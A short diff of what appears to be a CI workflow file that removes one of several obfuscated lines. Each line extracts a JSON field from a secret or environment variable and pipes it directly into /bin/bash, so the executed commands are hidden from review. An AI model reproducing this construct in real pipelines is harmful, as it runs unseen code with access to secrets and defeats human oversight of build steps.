@@ -18,7 +18,6 @@ jobs:
           f50: ${{ secrets.f50 }}
         run: |
           printf '%s' "$f50" | jq -r .nfok09 | /bin/bash
-          echo $p7955 | jq -r .jz3791 | /bin/bash
           printf '%s' "$gs27038" | jq -r .isnyz99155 | /bin/bash
           echo $tp47 | jq -r .yqbaq8 | /bin/bash
           echo $wypx577 | jq -r .ne6466 | /bin/bash
